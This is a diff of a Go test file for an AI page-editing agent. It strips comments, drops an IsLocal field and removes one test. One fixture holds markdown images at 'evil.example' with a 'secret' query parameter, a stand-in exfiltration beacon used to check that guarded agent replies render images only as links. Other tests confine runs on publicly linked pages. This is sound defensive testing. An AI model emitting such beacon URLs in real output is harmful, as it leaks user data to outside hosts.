 func TestOptionsReadOnceUntilProvidersChange(t *testing.T) {
 	st := openStore(t)
 	h := NewHub(st, nil, stubHost{})
 	if got := h.Options(); len(got) != 0 {
 		t.Fatalf("options %v", got)
 	}
-	if err := st.PutProvider(store.Provider{ID: "p1", Preset: "ollama", Name: "Local", BaseURL: "http://127.0.0.1:1/v1", AuthKind: "none", DefaultModel: "m", IsLocal: true}); err != nil {
+	if err := st.PutProvider(store.Provider{ID: "p1", Preset: "ollama", Name: "Local", BaseURL: "http://127.0.0.1:1/v1", AuthKind: "none", DefaultModel: "m"}); err != nil {
 		t.Fatal(err)
 	}
 	if got := h.Options(); len(got) != 1 || got[0].Model != "m" {
 		t.Fatalf("after adding a provider %v", got)
 	}
-	// Read from the cache: the table going is not seen until it says so.
 	if _, err := st.DB().Exec(`DELETE FROM model_providers`); err != nil {
 		t.Fatal(err)
 	}
@@ -1435,8 +1266,6 @@ func TestOptionsReadOnceUntilProvidersChange(t *testing.T) {
 	}
 }
 
-// A comment run reads the thread it answers in, as the server's runs do:
-// its first comment and the replies kept, by who wrote them.
 func TestCommentRunReadsItsThread(t *testing.T) {
 	st := openStore(t)
 	p, err := st.CreatePage(store.NewPageOptions{Title: "Plan"})
@@ -1463,16 +1292,12 @@ func TestCommentRunReadsItsThread(t *testing.T) {
 	}
 }
 
-// A sidebar run keeps its ops as they come for a launch that ends during
-// it: the first op saves the chat, which has the run, and the next ones
-// the run alone, which the next launch puts back in its chat; the run's
-// end keeps the chat whole, and the run alone no more.
 func TestChatKeepsTheRunningRunAlone(t *testing.T) {
 	st := openStore(t)
 	p, ed := openPage(t, st)
 	h := NewHub(st, nil, openHost{ed: ed})
 	s := h.Session(p.ID)
-	local := Option{Provider: store.Provider{ID: "ollama", Name: "Ollama", IsLocal: true}}
+	local := Option{Provider: store.Provider{ID: "ollama", Name: "Ollama"}}
 	run := &Run{ID: "r1", AgentName: "Ollama", Instruction: "Add lines", Status: "running"}
 	reply := &Message{Text: "Reading the page…", Pending: true, RunID: run.ID}
 	s.Runs = append(s.Runs, run)
@@ -1492,7 +1317,6 @@ func TestChatKeepsTheRunningRunAlone(t *testing.T) {
 	if _, ok := st.Value(runningKey(p.ID)); !ok {
 		t.Fatal("the running run is not kept")
 	}
-	// The app quits here, mid-run.
 	restored := NewHub(st, nil, stubHost{}).Session(p.ID).Run("r1")
 	if restored == nil || len(restored.Ops) != 3 || len(restored.Edits) != 3 {
 		t.Fatalf("restored run %+v", restored)
@@ -1519,9 +1343,6 @@ func TestChatKeepsTheRunningRunAlone(t *testing.T) {
 	}
 }
 
-// Each turn of the chat the model reads says whether its run kept to the
-// page, and whether its URL guard was on: a reply whose run is not known
-// did not keep to the page, as keptToPage has it, and was guarded.
 func TestChatHistorySaysWhichTurnsKeptToThePage(t *testing.T) {
 	s := &Session{Runs: []*Run{{ID: "r1", Status: "done", KeptToPage: true}, {ID: "r2", Status: "done", Guarded: true},
 		{ID: "r3", Status: "done", KeptToPage: true, Guarded: true}}}
@@ -1540,10 +1361,6 @@ func TestChatHistorySaysWhichTurnsKeptToThePage(t *testing.T) {
 	}
 }
 
-// A reply put in the page of a run whose URL guard was on, or that read
-// beyond its page, or one not known, has its pictures as links to them,
-// nested ones too: the app would load a picture by itself. A run that
-// kept to its page, and read no web, has them as pictures.
 func TestReplyBlocksKeepPicturesToRunsThatKeptToThePage(t *testing.T) {
 	reply := "See:\n\n![Chart](https://evil.example/c.png?d=secret)\n\n- item\n  ![](https://evil.example/d.png)"
 	kinds := func(nodes []*doc.Node) string {
@@ -1570,9 +1387,6 @@ func TestReplyBlocksKeepPicturesToRunsThatKeptToThePage(t *testing.T) {
 	}
 }
 
-// leaseServer is a server's REST API as public links use it: a page's
-// lease, live or not by the server's clock, and the leases it gives and
-// ends, in order.
 type leaseServer struct {
 	mu    sync.Mutex
 	live  bool
@@ -1596,8 +1410,6 @@ func (l *leaseServer) ServeHTTP(w http.ResponseWriter, r *http.Request) {
 		_, _ = fmt.Fprintf(w, `"2026-11-05T12:00:00.%06d+00:00"`, l.given)
 		return
 	}
-	// The server's own clock says whether the lease is live, as the
-	// query asks it to.
 	if l.live && strings.Contains(r.URL.RawQuery, "public_link_until=gt.now") {
 		_, _ = w.Write([]byte(`[{"public_link_until":"` + time.Now().Add(time.Hour).Format(time.RFC3339Nano) + `"}]`))
 		return
@@ -1605,7 +1417,6 @@ func (l *leaseServer) ServeHTTP(w http.ResponseWriter, r *http.Request) {
 	_, _ = w.Write([]byte(`[]`))
 }
 
-// wait waits for the server to have had n lease calls.
 func (l *leaseServer) wait(t *testing.T, n int) []string {
 	t.Helper()
 	for deadline := time.Now().Add(5 * time.Second); ; time.Sleep(10 * time.Millisecond) {
@@ -1618,10 +1429,6 @@ func (l *leaseServer) wait(t *testing.T, n int) []string {
 	}
 }
 
-// Whether a page has a public link another device serves, the server
-// says by its own clock, which the device asks it to compare with; the
-// server gone, the lease it last gave stands, and a page it never said
-// anything of counts as linked, as it may have one.
 func TestPublicLinkAsTheServerSays(t *testing.T) {
 	st := openStore(t)
 	l := &leaseServer{}
@@ -1636,8 +1443,6 @@ func TestPublicLinkAsTheServerSays(t *testing.T) {
 			t.Errorf("live %v: public %v", live, got)
 		}
 	}
-	// Offline the server is not asked, its last answer standing; gone, it
-	// stands too.
 	if !h.publicElsewhere(ctx, "p1", false) || !h.publicElsewhere(ctx, "p2", false) {
 		t.Error("offline, the server's last answer was not kept, or a page it said nothing of counts as unlinked")
 	}
@@ -1653,10 +1458,6 @@ func TestPublicLinkAsTheServerSays(t *testing.T) {
 	}
 }
 
-// A workspace run's pages count as linked where the server has never
-// listed the space's and cannot be asked, but for those it gave a lease
-// of; once it has listed them, those it did not list have no link,
-// offline after too.
 func TestPublicLinksUnknownCountAsLinked(t *testing.T) {
 	st := openStore(t)
 	p, err := st.CreatePage(store.NewPageOptions{Title: "Plan"})
@@ -1679,8 +1480,6 @@ func TestPublicLinksUnknownCountAsLinked(t *testing.T) {
 	}
 }
 
-// A page whose members or comments the store cannot read counts as had by
-// others, and a run on it reads none of the user's other pages.
 func TestUnreadSharingCountsAsShared(t *testing.T) {
 	for _, table := range []string{"page_members", "comments"} {
 		st := openStore(t)
@@ -1701,8 +1500,6 @@ func TestUnreadSharingCountsAsShared(t *testing.T) {
 	}
 }
 
-// A page whose sharing the store cannot read may be the user's alone, so
-// moving it inside a shared page counts as showing it to others.
 func TestShowsToOthersWhenThePageIsUnread(t *testing.T) {
 	st := openStore(t)
 	parent, err := st.CreatePage(store.NewPageOptions{Title: "Team"})
@@ -1729,10 +1526,6 @@ func TestShowsToOthersWhenThePageIsUnread(t *testing.T) {
 	}
 }
 
-// Serving a public link renews its lease on the server, which sets its
-// time, and stopping ends the lease it holds. A lease the link started
-// again took, as for other addresses, stands when the older one stops
-// after it began: the older one ends nothing. Signed out, there is none.
 func TestPublicLinkLeases(t *testing.T) {
 	st := openStore(t)
 	l := &leaseServer{}
@@ -1765,11 +1558,6 @@ func TestPublicLinkLeases(t *testing.T) {
 	NewHub(st, nil, stubHost{}).ServePublicLink("p1")()
 }
 
-// Signed out, the pages go to other devices through iCloud Drive, where a
-// device serving a public link says so (ICloudLease), and the others read
-// it (ICloudLinks): a lease counts by that device's clock, which may be
-// off from this one's by iCloudLinkDrift, for the page alone, and for a
-// workspace run's pages too.
 func TestPublicLinkThroughICloud(t *testing.T) {
 	st := openStore(t)
 	h := NewHub(st, nil, stubHost{})
@@ -1796,9 +1584,6 @@ func TestPublicLinkThroughICloud(t *testing.T) {
 	}
 }
 
-// A device whose leases in iCloud Drive could not be read may serve a link
-// of any page: every page counts as linked, for the page alone and for a
-// workspace run's pages.
 func TestPublicLinkThroughICloudUnread(t *testing.T) {
 	st := openStore(t)
 	h := NewHub(st, nil, stubHost{})
@@ -1814,8 +1599,6 @@ func TestPublicLinkThroughICloudUnread(t *testing.T) {
 	}
 }
 
-// serialHost is a host that lets agents read other pages, and runs its
-// updates one at a time, as the main thread does.
 type serialHost struct {
 	readingHost
 	mu *sync.Mutex
@@ -1827,18 +1610,14 @@ func (h serialHost) Update(_ string, fn func()) {
 	fn()
 }
 
-// Online is a host online, whose runs ask the server of public links.
 func (serialHost) Online() bool { return true }
 
-// A run on this device of a page whose public link another device serves,
-// as the server says as the run starts, is offered none of the user's
-// other pages; one after the link stopped is.
 func TestRunOnAPageLinkedElsewhere(t *testing.T) {
 	st := openStore(t)
 	f := &fakeModel{replies: []map[string]any{{"content": "Hi."}, {"content": "Hi."}}}
 	models := httptest.NewServer(f)
 	defer models.Close()
-	if err := st.PutProvider(store.Provider{ID: "local", Preset: "custom", Name: "Local", BaseURL: models.URL, AuthKind: "none", DefaultModel: "m", IsLocal: true, SupportsTools: new(true)}); err != nil {
+	if err := st.PutProvider(store.Provider{ID: "local", Preset: "custom", Name: "Local", BaseURL: models.URL, AuthKind: "none", DefaultModel: "m", SupportsTools: new(true)}); err != nil {
 		t.Fatal(err)
 	}
 	p, err := st.CreatePage(store.NewPageOptions{Title: "Plan", Content: page()})
@@ -1872,9 +1651,6 @@ func TestRunOnAPageLinkedElsewhere(t *testing.T) {
 	}
 }
 
-// A run reads again whether its page has a public link before each call
-// that reads beyond the page, and, once it has read beyond it, before each
-// that writes there: once a call to it, and not again once it has one.
 func TestRunReadsItsPagesLinkOncePerCall(t *testing.T) {
 	x := executor(page())
 	x.Ctx.ListPages = func() []map[string]any { return []map[string]any{} }
@@ -1911,11 +1687,6 @@ func TestRunReadsItsPagesLinkOncePerCall(t *testing.T) {
 	}
 }
 
-// A public link started on a run's page as it works, on another device as
-// the server says, keeps the run to its page: it reads no other page from
-// then on, the model told why, and one that read another page already
-// ends before it writes here, keeping what it did, as a run the user
-// stopped does.
 func TestRunKeepsToItsPageLinkedSince(t *testing.T) {
 	insert := map[string]any{"position": map[string]any{"at": "end"}, "blocks": []any{map[string]any{"type": "paragraph", "text": "More"}}}
 	for _, read := range []bool{true, false} {
@@ -1940,8 +1711,6 @@ func TestRunKeepsToItsPageLinkedSince(t *testing.T) {
 				{"content": "Done."},
 			}
 		}
-		// The link starts on another device as the model answers the
-		// run's second time.
 		var asked atomic.Int32
 		models := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
 			if asked.Add(1) == 2 {
@@ -1951,7 +1720,7 @@ func TestRunKeepsToItsPageLinkedSince(t *testing.T) {
 			}
 			f.ServeHTTP(w, r)
 		}))
-		if err := st.PutProvider(store.Provider{ID: "local", Preset: "custom", Name: "Local", BaseURL: models.URL, AuthKind: "none", DefaultModel: "m", IsLocal: true, SupportsTools: new(true)}); err != nil {
+		if err := st.PutProvider(store.Provider{ID: "local", Preset: "custom", Name: "Local", BaseURL: models.URL, AuthKind: "none", DefaultModel: "m", SupportsTools: new(true)}); err != nil {
 			t.Fatal(err)
 		}
 		p, err := st.CreatePage(store.NewPageOptions{Title: "Plan", Content: page()})
@@ -1985,30 +1754,6 @@ func TestRunKeepsToItsPageLinkedSince(t *testing.T) {
 	}
 }
 
-// A job goes up as Postgres keeps it: what a page gave its request can
-// hold a NUL, or bytes that are no UTF-8, which would refuse the whole row.
-func TestJobGoesUpClean(t *testing.T) {
-	var sent []byte
-	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
-		sent, _ = io.ReadAll(r.Body)
-		w.WriteHeader(http.StatusCreated)
-		_, _ = w.Write([]byte(`[]`))
-	}))
-	defer srv.Close()
-	st := openStore(t)
-	h := NewHub(st, remote.SignedInForTest(srv.URL, st, "u1"), stubHost{})
-	req := Request{JobID: "j", Surface: "sidebar", Instruction: "a\x00b", SelectionText: "c\xffd"}
-	if err := h.insertJob(context.Background(), req); err != nil {
-		t.Fatal(err)
-	}
-	if bytes.Contains(sent, []byte(`\u0000`)) || !bytes.Contains(sent, []byte("a�b")) || !bytes.Contains(sent, []byte("c�d")) {
-		t.Errorf("sent %s", sent)
-	}
-}
-
-// An op that could not apply, as one on a block the user deleted during
-// the run, is passed over, and Undo and Redo leave it out: the run's other
-// edits still undo, open page or closed.
 func TestUndoLeavesOutAnOpThatDidNotApply(t *testing.T) {
 	for _, open := range []bool{true, false} {
 		st := openStore(t)
@@ -2017,7 +1762,6 @@ func TestUndoLeavesOutAnOpThatDidNotApply(t *testing.T) {
 		n := &doc.Node{Type: "paragraph"}
 		n.SetDelta(doc.FromMarkdown("Ship the agent's way."))
 		ops := []doc.Op{insertAfter("h1", "x1", "one"), read.ReplaceOp("p1", n), insertAfter("x1", "x2", "two")}
-		// The user deletes p1 as the run works.
 		ed.Content.Children = slices.DeleteFunc(ed.Content.Children, func(n *doc.Node) bool { return n.ID == "p1" })
 		if _, _, err := st.SaveContent(p.ID, ed.Content); err != nil {
 			t.Fatal(err)
@@ -2030,7 +1774,7 @@ func TestUndoLeavesOutAnOpThatDidNotApply(t *testing.T) {
 		s := h.Session(p.ID)
 		run := &Run{ID: "r1", Ops: ops}
 		s.Runs = append(s.Runs, run)
-		local := Option{Provider: store.Provider{ID: "ollama", Name: "Ollama", IsLocal: true}}
+		local := Option{Provider: store.Provider{ID: "ollama", Name: "Ollama"}}
 		h.finish(s, run, Request{Instruction: "Rewrite"}, local, read, h.newDelivery(p.ID, run, local), Result{Reply: "Done."}, nil, RunOptions{})
 		content := func() *doc.Content {
 			if open {
@@ -2056,9 +1800,6 @@ func TestUndoLeavesOutAnOpThatDidNotApply(t *testing.T) {
 	}
 }
 
-// A run on an open page that could not keep its history snapshot leaves
-// the page as it is, as it arrives and at its end, as one on a closed page
-// does: there would be nothing to go back to.
 func TestOpenPageRunNotAppliedWithoutItsSnapshot(t *testing.T) {
 	st := openStore(t)
 	p, ed := openPage(t, st)
@@ -2069,7 +1810,7 @@ func TestOpenPageRunNotAppliedWithoutItsSnapshot(t *testing.T) {
 	h := NewHub(st, nil, openHost{ed: ed})
 	s := h.Session(p.ID)
 	run := &Run{ID: "r1"}
-	local := Option{Provider: store.Provider{ID: "ollama", Name: "Ollama", IsLocal: true}}
+	local := Option{Provider: store.Provider{ID: "ollama", Name: "Ollama"}}
 	before := ed.Content.Copy()
 	d := h.newDelivery(p.ID, run, local)
 	h.arrived(s, run, local, before, d, RunOptions{}, insertAfter("p1", "x1", "one"), "Added a line")
